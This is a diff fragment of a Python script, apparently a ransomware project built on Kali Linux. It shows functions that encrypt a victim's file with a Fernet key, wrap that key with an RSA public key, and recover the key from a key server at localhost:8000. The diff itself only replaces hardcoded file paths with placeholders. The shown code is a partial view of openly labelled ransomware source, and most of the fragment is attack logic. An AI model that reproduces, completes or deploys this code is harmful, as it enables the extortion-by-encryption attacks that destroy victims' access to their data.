@@ -13,7 +13,7 @@ def encryptFile(file_to_encrypt):
 
 	FernetInstance = Fernet(symmetricKey)
 
-	with open("/home/kali/Desktop/Ransomware/public_key.key", "rb") as key_file:
+	with open("INSERT PUBLIC KEY PATH HERE", "rb") as key_file:
 		public_key = serialization.load_pem_public_key(
 			key_file.read(),
 			backend = default_backend()
@@ -28,7 +28,7 @@ def encryptFile(file_to_encrypt):
 		)
 	)
 
-	with open("encryptedSymmetricKey.key","wb") as key_file:
+	with open("INSERT ENCRYPTED KEY PATH HERE","wb") as key_file:
 		key_file.write(encryptedSymmetricKey)
 
 	with open(file_to_encrypt, "rb") as file:
@@ -65,7 +65,7 @@ if __name__ == "__main__":
 		encryptFile(sys.argv[2])
 	
 	elif sys.argv[1] == "decrypt":
-		key = sendEncryptedKey("encryptedSymmetricKey.key", "localhost", 8000)
+		key = sendEncryptedKey("INSERT ENCRYPTED KEY PATH HERE", "localhost", 8000)
 		decryptFile(sys.argv[2], key)
 	else:
 		print("Unkonwn arguments: use either encrypt/decrypt & file address")
